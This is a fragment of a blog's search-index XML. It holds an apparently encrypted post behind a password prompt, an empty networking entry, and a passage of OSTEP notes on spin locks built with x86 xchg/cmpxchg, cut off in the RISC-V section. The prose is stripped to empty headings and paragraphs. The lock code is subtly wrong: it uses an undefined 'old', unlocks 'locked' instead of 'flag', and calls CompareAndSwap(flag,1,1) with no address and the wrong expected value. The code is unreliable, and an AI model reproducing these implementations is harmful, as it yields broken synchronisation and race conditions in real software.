2610b8dc823aceebea16e8242bae98aad4804ea3fe899c88ab6734003cac9b128b9af560b709ebde02fcb87576253de7b9f2c456ee96e0cd2165b8e63c9d97d75fa0d32c3e71382a966e32042ecc981bfc2ca4797acd9add78417f5af456b1ec7ab2705c1baa8282daa39db978472b6ccd286bceebc91f05e51629cc0d982882ff033e32b132c6fb102da9846c6dc1a315e16989816683de19c4a10799a56c70feaf636320d615c75e9d8efd762f6a7df9e4f28b8cafb5afbec1a34687beaf4e45c23e6b004fe548794ce28846b37a9d65a4dfafec58e02af7527b6367740755387f5899db39488e0aa70104b351757b56717e6473b0c3470a60a890c64e3f491ae3737d3e530e4ffb977b6a5dc8e41348b1d2f0a8947b77089883038ea668c523e71d5b4196915266b6493172280f5e8b1b63c6d050f93d1bcbd728758c069d9a9a8c4cfaf5a1b636ce57906f7a20084df00294fd217eef8b5d09730d95b511e7041d35b3d6b0c8414eb8807fe2817bc18a815db5dec9404b49c19ddb2d6be6705b747da0bbb8d3f24715461925a9e2868e9d930bafe4d73a3b089ef1713ec34c33589f51b9b3753befcbc71478d381a0a6acf8a5c013da5cdbee831bf0cf11c0969364571846933080324d0cda69f76cebe138d7e4a42762371319cbcee9e09e20f0af010b3144ac1bd324a85dbc68be179fbdf75d13abe8fcdc6b802ab0a78d4e982285f2c5396ef6ca43d571cc05b9841f917d2f5d16ab1b74f3cd67350b7814f3116379beddcd2980516af3193530a5034fa4e1b88fe26c8581dc18b801cc58ac7b7d7446f4b97a229def6bea61c20746a75f0e7d66b2f26fe095475f85364bc67722f51dc77dc838438462aaa506901c9790da77d665e5dada8e798fa71c72a8c2f77afaca409ba05cd321d139cdf447c8fe43c7e0a2cdbfce902cb1ad0e030f31242859ba20d30deeaff964a6fbe36cf10ec2ab669577e5163fe26e966e96c7b9bc9385cc7c9c49d387da0b012c6b7d29a11f7f487578f0c57562da643a220d857bf54a959ad1885fe8c7ed581142ebcfe039aeb68f91d2ae1b9463f09327acc6226350f0c3915557cfffebb48aec57d680bb39a104897a66a37e028d19ebfccb847523c21dfcbc3e7ffc36415d3f1839595f35de4f5626266b74d5ef7c6e1e52c5dfed9ad7998163d3766f02f5c084d506dbba94d10e0c260f355fa608b76c619a4aa87519778c1b62b72fad82996289b3c416dbe183259a9bdc327b8eec144b0f9a542e1c3cbfaab06540993a6c90240f7626deb277f01397953e246814048ec0dbc804790e62561e0494f113294b3c75049800b65468e7f2ea1dae731eb84da1703dbbc093aee46ae3f4bed984ccce2a41f9a913e6bd5d5c3d210ede4221b3fa322bb8456209257c83e091bf9dbf7c1a73349e8a7347e6e8df9fe8968d74d173e0a6662e8c0ec997e61931e9b4541d039c07480aafb227bb03ee9e7ea5294a85f36e6f47710db38c842ad3c93c0cff5e5d4ada0e71f2dc7805a292877d875b2900e2d6adfff9a9d7758baa57049e247d89f609fc929c1ce74d542749f362c0871c201f801e2d11ffc2ecacb9c299e1f23cb9bf8efa60105db7a05a414d1cdf9252ef7a2fe3d6cb53ad93da10974fb4ae2401b4317c05cb90c413c2430ac0377563f1b054a9790a31a7582d2df8544331aad595e744ef909d6397ade5e78915d54296bc51e85ba28039906040919b5daf823ae464ca5029aa854d85e881f169fa54df01628804cda78fbbb9754ece1d9579a1bc82153341e4c420c05b23eeaa29b9ab5e8bf4b620d19830a5eb5cbf2879f908ead2678651127dddce7814762a9a8c74fba836ef971e6f87a8799aa3568c979cceba52850653ab91bb97e555f05c84a955d098af824418d32418314be2a3371b0debd5f19db7ed67e5ac3e309d432b0159a1a345e948bf33f77ac16585fbd92b41dff5a0bbb89a30d84bfbc33bec076af414e55690778764899082cf94ae2294f41c32fa3432a59a3be6df2354c539e70a0e1d5d484c0eea7b8d4c62d2712efb27ef4ee2e35f092a5fffd41e63673ccd05ee1940336a96fe7bb3569a56e82543457afa8e5f53fa7d452a0bf7cf3ea8b1ea6f75ae0ba4d7156fff4df8bfcc1430bd5bf755a33b1df218afcaa2056ef99de2ce3b58c2aff526715ab28a9e02f8c13e01c658c33a4fa0e30e5a1e6a954726d0246645e727669020d1b14de9f6135dbd1b3349d0a22c4f7c6c251f715d683fb0d18006f363aac36c6004b6b76a2de359f84798334307fd8bab46a859bd3c4a406cb4c6e3ff96d06fc43bc219632edb76eed480573e01162a7ff42cb542214dacf9f4fdb69a07828068375c5a1db5b5d927f2280e2b296df1fa6698d3dc6769ec18f97194471035a31efe147912e7b2282314a62591f14253d6ec513db9a84022e0c0c03c57c919e4120694599eb3b63a0b912e51984ccf7349b8589d6d3d41c318586a3dcdcbc6942aee5ae7a6138dd5b708e567b09ee1105aaecf70474e097a4f5860b29623f716d1261f271cc08c34ff8535d3811422901c87eb29faefc925a0f6563aa810961210ba974ab652c6939dd24b5d72fdc44e8f2803d92fb5dcd06b564d25482156502b18496084e0b7843ebca9f1605c04fc170a4b83039dc37d5bf56174949a59c801cb51f5f04123b205fc582688087c963b0b4395883cd7cfb51b093b0aa5451845ed31c2c5cfaa4b6bc71bcb395c6a0d0e596eb0a13e147e68448eb7f0abc0bcc56e15bd954b9112bd011ab69a09e2de8931089cccac7b3992da1e907f15ef68af878eea160b149dfb59b0ec90b1c1b110e67b00688c4cdbff6ca4904c661e07f7646782932bb179681102ec02d6dbd5d999dc3c360de6ad2922799ade22f38a466709be0f2a55f1ee3a8e31a4109b3979d5b27743126e4da24a7e3a511ad08850aa802412d3e2e79121737661870a06378c6eac57291f113c51c18cc4c3b3d109d21ca24ec4c517d838fcf7a2d056cf102ef60d63cf271d2457321bf0b1c87b35cf5cf4c8464520300aee0ed8c06589654c2f22758600a8a5485d8aeea9112e34fa14cc0215c9f3dd6bf9ecabb9c42ec2102218abc36971468cca66fdb1461834dc412ea54ab2a502c946e2fad32145e5f5763355a513e480357bd402b13d52cb62b54b93841ae098482b80933f2dbf99a3acb04ca14bf18c78da5717e242a00c086e94750051cf653aa16f9e3c39b4976ab3d52fa3419d6fa21f2dd8cfc35aef2beb3ed8e294663319f9afd83c802b605179e526d0b570d486e1a36cdc236fcdba6a8ae6b34a1b7c19aaf19bdaafd08e8c82cb1fd286ca7bcf958cb360dc5d2b637e1393505bfd46bf2591f0413b9638b2e68e70fe642dbb8d00d0fb50c6167ada70673c2404200eed820ce01246b5a5d334aa641cf60bbeeecd930b272043d8782b4c69336c0a6f9860a3c1a4d581094c5a8c1df97a94c68055fa2d109f8b7b946cc9e941443b533cc276f101ac25e1d0764977601792ec7c81339ce98d16c8a5f6b7171df16d11bc911434bec8006128d2668fb021a33714c59e0a0ee0f9da3bd5985bff3669244cda0b45720832602d960a0c2f96bdb8c9101849f59df254fe33792d6a851e79ca6f48abeada51e1a4d2e861c996cc5e0f59db100b4fa482dbcf6ea1b2c9633f3f7cbb9a0729ff02f864e1649ab48aa353ffec69d4db70c3444c7619256fd1cd3556821c97791edb01e265a0991cdc7b910de4cd29ab6cc98ca7650529230ade9bcea7e08bec414f41f25d9efefd55eeae395463ec3b92abd9b2b1a9f46100886e86e888a4943eeaf46adc9a7b3273199a42fe49390899ff4b895163c24681c3cc7cc8dc4ef44d6ef8172ddde03ece6411a55c3311e20ec65ce126ab8f66ffd1b9385293b4cf0f69611bf36cfa38a6b040eafb65b61ec40f79d1c9a1599eef07fd44c901ac69ceee9405ba65c11a3b83edb7cceed67ea5132492ecd6a251eef512b85f2577e9212b290acd0a5bcc3f05b2a2e751f54b48a8e7b8b024172f053352bb1e6494fed4c0cef307d1413d49f12ea6fbf356014473f010be097b76f5e5a821404cea9c045e6f633a3fffa75068b0e271f5a580aba47b6a73a2a2d39cc6f1ea08b52ce016b313d6067e36caf6f4763204aee41934f9073d248f569e05b1dda3aeebb33b482e7e9931dc66775e7d6e3420b5762e363d6f84296549c17a8d6383012bd1dfb4b8aa45909339b59ca5b6696af7b8ed842b57ae08d2b80652bc293f61526d1c9a91d23681eb1c2c2aa0d532c6da4e522adf036afc0a04b5c7923ccdea858ecdc7561a5f480cb0aec632872296ec037fbfbc4456b5cca92bfee6360d4d91f1ae5008b368f94d4fe6cb7dd640951155099156f7b7d7e14fd295ccb375edb40d6fe36044c571bd3a4fc99de922127932038a6870bbc501be896ed80af371eb8f66f2b2033ec9868315bc07b02fca706d592c6d8e1a34f592a984f6e37e7295071f6f0f39da684eb86a3a336c8909ad5cc274e0752868e83418fe2937858573cfa2a0fb153616358c61cbfbd39bb51b0efc031ec031f71be0bd19cb15ba12b7e8940b3239a36a879f98ec059020c5a585b7e4566e12107403a5aa2475fef642180c41e782dde1f1e05713e3cda9773f7863d565fba80181fee2e4506a22377bc15d03a66ce3c1355eb555836e78310caa374145fba7ed61c1ee7363cb2e546dd539f7583840ecf0cf9b95254f42c54a92696108fe5c5c13549d897e92d0d2ea3686184dfc6218e677503682b61306b3a1a5fc63eefe21409174460561856b86bdbacbf1c81935b21acdc2e6f88f0b50ef60cef056cced478db6bf6fccd3aa50afff3dc480c796107a255047783fcfc45b9b6eb8ef7db552717da5eab68ca5f3c1c72f0a0f1eb0fcc315fdc0b07ce83ccd255e517cd5d804583f75718a644c093f81b10bb1ec78e9679d9f96419f9db02c6bdf2477130b1faeb248be1bb0ab1e3691af2d94c3d9e9b29fabf72f5e91f220fb68ae076239d71e8027258238382994522440633f8bb41ad1eb90e4d0b017d89954edd7f10571125b54e326ae18075cf629e3e5d16c43e40169f224a9eced3a25b9d3d419815d93d0317c942ae5a960b0421ad413b1db5b98447a85c6b479979db30c999181cc3e58a92c4cedf718b14cad942e074fd9d2d58697f7005398ec8567aeb365f1435760c1a281785254c775dd35eaec37dd7497824c9b18302f2ccf0fee712b05c4e72342a78c36efc14e4eb4670a523b226730c4687d77c7aca3f8a0ac8e4b0dfc69788d1dbc8a9ef65b09fad81c3edee36faabec148e63ad7afdd44bdcf5e2825cd7ac679f7f424cb63996e3fc2068edd1c01ea2a6b71bed38a18d0df51d552f8a1f85f7fbecf869b79188f959ff261db599943b708c137843c8ed850fefbc6f131f76d7a204407b03d28b6294bea432e1c782bc9f7adf0ea5e36bc86e12a9160b9212417a764dd4148a403475aa89abf9ae348721672e55a0b0027663c99fffba1da94975a248603c78f5a680150667098614f5d80df17f6385772d1518bffd68fe94f4d32b9bb0cfbc6e7323a24389781daf14d347773ab1bfdee5f9d6eabeb3a7ad82301a27677f226df93305368551db8c68a2c111f667de6248c0df2444ab135ae15438fd7c1afd99e96e03fed5d82d2d3b74b6197b985cdd86f6dd956d79f335d5f1adc8d5162e51fdc04ae57a17111a055b439fa66bb363d347418170843a93bdf319c007347eb828d8c94491c39c334b5068f4c22c6fec60ce7c97a9fd59660ccfa0c91878b7825f30b0486bc26dfa00361fefd6a7604f9344ffca9a321f938ea5ee6a96c678d680665fd156c087fb83fa19c2d26336da02d7dd180178fc17406acb066181f6c4636ec17059f671ed5781e1be09698b3482acaf53c9c8fd50a8d93d54437ba4387987ce9ff55b3badef9b99d95f860889f597bf604d629b5811331940f6c041e09a2fd0ac9afc691509b35499e88d1ec1dded411e15e757524df9b1f89d66912a81b5bf568f9af666414848ce5b9eb269f2c16f4cc913039859f9b38ebfae205c35b2587eab4c6286764364f588158fa3b751946cdd14466781bc300c47ed743e04e5e4011e5ace03efcf5b224d6f0c11dcf08f2e7c639203231a8d67041bcdbee7183583d2e6812c76698b1c90068b4a51dd047aefca515d6aef38484fce951a7393daea3a02f5884d6b1c93355b0000fa39532c1b44b6bc3c0a948d92d1bad84e89ae475778e45a21a1bc9185daa9b478a7ccde52d759bb03469945014a952828767ad9b7a9977b692d65d42c1f10509e6e3b352cfb1a9bfb1f0be75de3f4929ee4e241cccecf816f7b7f9e61d3a9cc0cb3513dd74548d9c15ecfc2badd1f2e154b95d1bb54e3f1900a84c25e2dfa2b2d241b286108fa5a6423bc5d1c510b015a9d655b0a0c69137837d1d8d44f576a54364f4fd8aed862a0379c0756a40c277f054b92df7613a405be97fb65a1e84cbcafa32a75e77bfa554480ff941dfae306cafeacfa7de76c90c810338205e60e9926ebcd2be333d2fedbee0db6869fd8a7aa0541f58bdf5450a3e1a90ffdb87686d78ec251dd188b300771119c622c554f6961ce1210a61bb718f1b41950258d290f35eac77f56939d752cb32aa38229efc8355d83cce630bc4b20f6dd3d62208d2617477da7b8fc1b8faba201ca4e79958108203fee03680b05b073e846f45f5acb49474b069fcd8ed5a6383ccb25da06e241cf44712aea7d0bcef0c6d398105feae62ef3e7de75ced62a15443ec43f0fd89b4bfa8d18bf79d81b07f487448ebd2b19b72a717c548d41f37f1ee6e85cdd9719f769e43f3a8002d938815b9e36cf4f9ad373689153b461e1567a480bac5c704c90cf5a4612f4d63840fa8dec77d359d1e45525b0be7520fae4c453f2629dba5287a40a903491ce07666d61fe43b1524a0499cb056bf9b9301c7a63ad3f06f8c15acfdea58e4f1217f290dc50a9d3ef5f81e5a6bd0e4fdcbb1e74ec864ca1d1d24bef46f3ffd3e070afbe53837b95b70e48d1a630741dd129e69fef9ad35cd2109d69ace067ad380ffc41b5c5e9e4a862b11287d834c7f422e9fd8c1d41e8b1a7a6a193abeb43aa7111b564fb8d60ecd6f9c87ef0574109394635bfa6c0d3100493baacbb7ab1c90253156725c66477ca38c400d6717bb2fdba77feb2a598a01173db93a9fa283d9a18f2f276be73281a6783a6c105f9b4ff5f38d13c92556ad78aa8c9ce8567a9a1968eb9a5937498107fa06617768843d9159126d4ccc41cfdd4c57113842eeb0ea6656cfe1c18a2c9469e0bf1800a4a997378e41124069857648db8449b93a94bdbc5d10696cf993f977fa53d3a3ba960c4ea366321717bc13ffa1a8e6dfad4ca8949d5862b06abb99c512d29dfc7615bea34adc193069861ee4050327548d5c09ad4b0d72785d66b579f7fbd9de8ffd4ee5e203e88c2f40faf87f092bcf9fb60528ab5448ff9eeedce39e1cd4b4912a2f2695af553f1d12f64d267c50ac01bfa8596025f511090148f7153dca4c960f9312426fbb9defdeeb58dcdaf40315808875b15a0c54e3649c5be11ef8970f93bd3d8ca6e97bf48cda153311e015cf51d0044b1c0cddc857636b01eaae6f4ee11ac14a84a17918dbe00482bd4e60776d43ae4210dea9e10d38d98567a1c52402f5e7495b7b1667464271ef903dd50e07d5407715a0b5f6df889bdaada249396588dd2340d0a3e3b4196bcac15f60d2b8313a899e7204e2eeaf873bd364b20efa73d0fe4c63092888f6e8ef1abbcba1de0c384061599766b9e59e7257a0fe2ebf39732138a74198df101405085198c2602f50b0e0c47bd42bb001bdfe9b52c0f855c4313daa3a8ab5f8f12a2002e7e825b3633014374e67dcfc6b760b5d2aed910f1cd03b4ed36dbd4aa79f72e03f900805c26b53eaf038ea2240b701832c3525561340f9c2e9301411c520e2a85c2b4fc0f8a5fa0d69a9415a854f4269684790935e845c0b3c21bad5375597f1f7ac3c3771f915e7b31ff5771a315b1a89e8b0a76a18915a4ac237e9e5502c294be2b97a284934bc18febc9224c51c31d46dffecf6fff726d76fbdf47478f982358e157d93f703481b0063692f7eeac47a71d7235847c90138ac3e781e83b23212b663943d92b5b44c206c5606f2ca3a7a9cf1a6af2a6e1032f22dfefce24e94aac23d16b23b727f255afd5c1dc0619dd8204df418225b0441b6831eb20f7a63eb54ce66cf0720126428c285ef6c4be85e4e1f4231b4fb3dee6a8616bb07081e2dd54e4ca9919a096b1a3fa71720aa7778ba7277d352d6093dc4ccb4251872c679804f8fbdad222d1be49b450986151567e9f11c595b0b4f99c5f39962d79d44325f8be039310fe2c5771021103936197e1318f1f20ac1a76fbb56f3db3853210ac6b7af935f91c8aa027d1ea90604f1d422ca8d68cc200e4141e701e79a6fabf7534fb7334c22afbbcd7d494890dea57232756f4d907ad3cc8fc7f8009f5a21f8bb1aef94b0da91fa23665a7d3c20475016a5d0783fee8a22239c6b3303b4d1b3b5ca73ac85a7e89cd40cb18eabb6c3cd19d112f2362cc71ca1ff06aa644789d2cae9d799ee8f4b45fd86a1b85c93df36a0085d79f7514ee9217ce85c68d6dc87aa50fdbe991fe6be8eedf4d43d40ad020e618888753461eb15f79aa9381778b7ed44bcf85b6411f8f18ed126592f828d55dc1d725d5a1174a57190991948c55df988c22b92a12e140a5f5d2f6c5972b932f8b2d4b36c354a5ff035a0eae8f673066f3a08b116c4b9f025854a9aff386718d0aee012cc825c02273f9fa5fb33eff75fcff1493c172ba1f0fb863ba878a0d3ac0107e54028fe774061458e33e435987f640961a11eb511856b24f1ae886aa13905d10537bdb8bda19c3d78b9996cbbf773a5596b90bc5144f57ecb844dec99eadbd3d8c796f9eac6803439b8269254480143633963a3e895b76f90b7fdb9b2fc13301aa74a6e922c5d838263c74419148ebea3f908cf4fa585e158886ab17eed3d15e429ad7449b0333cc83ff8d56664a1bf048ad364d4ccd82c51d3a848a324a07f690bb2df3499daf3f53f3d107f00230f6119d3f7be68f40996407dbd4287bfb7c69a36df0ea71814e09748e25181e441da620e394378a93f7891337e580732db35de38b1120ba83bc67eb8ca9d060a5526912825249ee83e517a92f7f39ef0fe7601ae32cfd88370d1f5cabab5d68e186db5a1e1844c227ab2dd4f13b873762a1c74aadd41f461e3199d5b50b58cc69862294d5e6655b13b3eaed6d7114c333a3e62dd309bd5768ef7399044d880fb1baec2714c673608ce605ac77141927fc2d585f386de87d180107d6010b29c304d88d659657bbcead92605bc8e723d1ce7c069a1eab72ad40dfa7f262c09168e2950fe7312b83f0547c4e01e81537b2ab2872098fcb53287791f00ae25adcb6b6caaddcaf8d9e1bf70afb1a6838ba6f71105bf3aca25da28dfdcbc1ee813d8b126e8cf94ed9044666383817b0cb09b6272f9746b55fc911b2ea1745ef0d2e772d0d2f90e160fe5c22aa2b77ede835f6ad5fbf106e8419003a031d51561afa2690e4634d3ac20ece7e8d4666f3432e41dfd9ede187395a7ef85e46400e765ba3e3154c69ad08154cbeffa2f195868779ad77fa7eee418b37ff319b805b2899da9ada8e151f8a4afc1f54fe444bf846fe25fac1c94dac882cf700cf6cbb370ab03c0b783c9f4c46ac2c89f9fe97ba8ad35bb6debb953ee0c43d4ed1deb8de9c8154320b20c5a390d4efb2f83c8585635d5ff92f97906554874629a500f6443b3ffbcd52ad386cefac88b6088aae765603e304dff90d5184abd2e2f20b8e199bf9b2b2384b206e36d5e061c8bd9fd5438b3e064616d3e632d51f7363eeb89ca0e74cb0b399402d6ec6465328b993d19d78409d8e8dc1406c65412eeb24df6e43119ffc57e8b370567b622408952059adcd9f53854c1fc0acb0fd8b5976cf33e1a5f9a52ad4547a160ea9e4ca0dc18a289de7f25ce49676749ddd2b82e075e4543184d822c491958725b27ca4955de8976182ec5adb42d29f0a5c7c3afbf3ada7b94da8fb101531fbc282178fd27acea6f56b31e2b4c6a85cbbc30a128871f048350aa360313e5188880aefa57d52b9ca6e21114a5eba1cb7a5912ee310206e642a9490cb813bad49731bfe311d97913fe0507368fd05d6aa0b813e4063c36c0d09a15e9519058f2a77db6c26ffa519136e71a791ee353724d29ac087eb1f44342fff459f482560cc628458d1ae6f231f2fe552360411531617a37d210216c81851775d518447ba3d6187e77f5a41e9d678dcaec1470a0b45352d21adf6914e5c871a4e7ea4c75fa058ae1f77d928e4dbb7b1a1ade81ddf949bb45cd46019a37157bb4ce7c5a3c1650d52717a0148833376ea9ab66d88dc31b25830e499ae9a706847037050aafebc491704b2ccaa1bced9c8920ad6e839bc4c2e9f8c7140bbddbb19113f5c6c9a6620360ece15fb105728fce45375748a5ed2a162d6ad9ba1d0820d63cb699bf6903f9266cc530ae6f92fe17b9c6325ee9467c9bae34cecfaa90767dfb90a4501d507c8960812828c5b4cbb8fb4b979832ddbb233aab6cabc2ed2aff27d2b47899c22ca262637585d9a2b8364dac4c55797a9bad82202373556d05baaf09952fb31b3bf05596c7a01a49d18dc192dd2b7ef24bbe623be47b3abaaf6cbad0c23c83fd7d9d71308f20c69e505a3ef48207d0907dff5c484c92a211eefb6acba36e1b687134d04d532410912993d5ea381f780332f54b59fb081db716d5213bf18557ad1182c3f5f49723debdcebc549b19bad99618dce0fba2e246a426bd6cb938b7e374124fdbed544dcd95287db9768f634a5ebc0cc8c533c5e094fb41e8ec65881b347e7cc71077084d96fa43d4bb7b8715f52aadce656c1937d8e22a8429f36102c7680d8d32ec6650f11a2949958a1a404a88a3c49e10b49e24a5351d53bf54fe448eda3ade621bf21da2dd62486f2d40f87c341f726a0e6c4047896c74ec721354bd199ed761f3289ce196dad53a4b582a8c1fc9b24bff814c2490648bd2c90d1cf2f8e29e4e338c22f80fb9c8e79ac9f2aaa4c9cb832757a4353eb45acba03f8a62ced089497e3538e7fd8aebbfb791b38d0dfb7f7685230f80379ffe6471d740a685819d8aebf27a4484f1298d5e2fc36199e321dfd60c7c6095a4e7a44ddff96aa0c9c33482580a513088d0e258b0bafabf0fe2fa808172dab9559babe7d443671cade5912f6126059fff7e1bbc36a3f2c6378bc07c7678c104b4da9b62b751ec6d606fee50b79b0a2fd668cd96782b2bd23752db4225ff5d72c6c1c1d8c0e6ae163731b474b6f266ad5948f381a025fc86134cc26db6d37fae92c0f697e1f20f315995c44e2311c35b06da131088568e98605e923e95aa8d4029adee0fb3ea5c733e5bea4deacaf61cf254d60db02c813fd3ff9481c7e8471be345df856b580d68aebc7d88088f84a1d56bb184bdc5790341357406353d7df33dd2739b3b06fe3ab043f4a4e13898a6427d072e2076fd815a27a00e152308f8c972f31d3db9e0352903581f1c9d68c9c11b708b7704dc2d4be9f17a8e3c5539d41dd58c7228984e8e385ad91a43b40a58c1583aab7c90fffc8f1571fe40eae37b0c1a2dbdc3e43ba3b79f709057364dbd6902c3f39ffc8427de5041ffe40b5886f1bb98908b61d66f1cd5ed4bdfadcf02e64a138a07c6520a1ff613617feed4a8fe7d5251d8b138ddad0d8aa97ce42af8abd60f5016993b111e16620b957b52f64ed3c25a12acd008211573f2d92abdadac4a1deb118763f2f1dc2c9bf746cfa140f70359dcf162236e58890f8c020ed455114eb6bfacbb021643225524605983c1aa879afec00b75463e6f631aec77e0a60451102747de261af16ff114a94c1087c3c9f820d0121d12e41c905cd126dccfad85bddfb3e56a787f02b2a403922c0f6486866b346ffa56ba9ff0172e955059a91c3e3536202e21748dd48a52b4deb099340e67b8f8c45c5f29280913c0e847d49b196647cf2f576acf461050b2573aa4ecc840b99c6a0b2d8f1d15372a88358a09705cde585af1f859a58c5b5aabfe1594a8b581d4255c00886dcf5fa0a39f72c30ce55c242f8a5e59972146d29661c1dd932356ac85158e2aac184d60a580f09ae8d076dbb8e75d9f6b935af6423fdf3dd1e21f3be73c834a8d64c840b61a66388a49cfef3a2dd1eb62e6f4ad5397b52526d69d49215c19f9b323eb67aa70df307d71bb97ce0b622806efe6d0af10b266a35863905226eb023c3ff43b396f3b9b6a094083af5e3380e98bd4b074d47f195796b9c318ae07b00164ab3b3022ff7e92e872559d0e98a3892d860142776bab2c3cbd8ac2c0cd2477eef4c7c7eee337d3173dcc2a48c25faa25fc4dcd2a26415465b9648b5cfbf9963fd539296170a9a14e985ab21b96a45ed1bc6af006b0beb11a0e204582c2369673e1d4f79ad27e24524438f45081da62ae08b11eca1833f1360d72884a6b0366322c1a53e97d37aebeff6f76dcaf8b0460945b657bcd9504eee7c62139dc2505da6a45f528778f63e7a5bad253ccf4fc8bc0a3fffda6afb05e166ef1965d060dd44e82a5d993518e486c8fa82e8e50ae0b348deaea7eed59ac4d15801c097507c4dcc372e87deacdc7ea6fb492489d2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>:</title>
      <link href="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/"/>
      <url>/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p></p><p>UDPTCPIP</p><p> </p><ul><li></li><li></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:27 </title>
      <link href="/2023/09/03/OSTEP-28-LOCK/"/>
      <url>/2023/09/03/OSTEP-28-LOCK/</url>
      
        <content type="html"><![CDATA[<p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li>:</li><li></li><li><ul><li></li><li>cpu</li><li>cpu</li></ul></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>:</p><p></p><ul><li></li><li></li><li></li><li></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>:DEKKER,PETERSON,</p><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p><strong>xchg atomic exchange</strong>test-and-set</p><p><strong>spin lock</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">xchg</span><span class="params">(<span class="keyword">volatile</span> <span class="type">int</span> *addr, <span class="type">int</span> newval)</span> &#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;lock xchg %0, %1&quot;</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;+m&quot;</span>(*addr), <span class="string">&quot;=a&quot;</span>(result) : <span class="string">&quot;1&quot;</span>(newval))</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = YES;<span class="comment">//flagYES</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line">retry:</span><br><span class="line">  <span class="type">int</span> got = xchg(&amp;flag, NOPE);</span><br><span class="line">  <span class="keyword">if</span> (got == NOPE)</span><br><span class="line">    <span class="keyword">goto</span> retry;</span><br><span class="line">  assert(got == YES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">  xchg(&amp;flag, YES)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = <span class="number">0</span><span class="comment">//flag0</span></span><br><span class="line"><span class="type">void</span> lock() &#123; <span class="keyword">while</span>(xchg(&amp;flag,<span class="number">1</span>))&#125;</span><br><span class="line"><span class="type">void</span> unlock() &#123; xchg(&amp;locked, <span class="number">0</span>); &#125;</span><br></pre></td></tr></table></figure><p><strong>cpmxhg Compare and Exchange</strong> </p><blockquote><p>x86&#x2F;64cmpxchg</p><p><a href="https://www.zhihu.com/question/492576993">https://www.zhihu.com/question/492576993</a></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">CompareAndSwap</span><span class="params">(<span class="type">int</span> *ptr, <span class="type">int</span> expected, <span class="type">int</span> new)</span> &#123;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span> ret;</span><br><span class="line">    <span class="comment">// Note that sete sets a &#x27;byte&#x27; not the word</span></span><br><span class="line">    __asm__ __volatile__ (</span><br><span class="line">    <span class="string">&quot; lock\n&quot;</span></span><br><span class="line">    <span class="string">&quot; cmpxchgl %2,%1\n&quot;</span></span><br><span class="line">    <span class="string">&quot; sete %0\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=q&quot;</span> (ret), <span class="string">&quot;=m&quot;</span> (*ptr)</span><br><span class="line">    : <span class="string">&quot;r&quot;</span> (new), <span class="string">&quot;m&quot;</span> (*ptr), <span class="string">&quot;a&quot;</span> (old)<span class="comment">//&quot;m&quot; (*ptr)%0ret%1 new %2*ptr</span></span><br><span class="line">    : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>cmpxchg dest,src:ALAXEAXRAXdestsrcdestZF1 ALAXEAXRAXxZF0</p><p>SETE r&#x2F;m8:Set byte if equal.r&#x2F;m8zf</p></blockquote><p>c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CompareAndSwap</span><span class="params">(<span class="type">int</span> *ptr, <span class="type">int</span> expected, <span class="type">int</span> new)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret = *ptr;</span><br><span class="line">    <span class="keyword">if</span> (ret == expected) &#123;</span><br><span class="line">        *ptr = new;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>spin lock</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;<span class="comment">//flag0</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">()</span>&#123;<span class="keyword">while</span>(CompareAndSwap(flag,<span class="number">1</span>,<span class="number">1</span>) == <span class="number">1</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">()</span>&#123;flag = <span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="riscv"><a href="#riscv" class="headerlink" title="riscv"></a>riscv</h3><p>LR&#x2F;SC </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lr.&#123;w/d&#125;.&#123;aqrl&#125; rd, 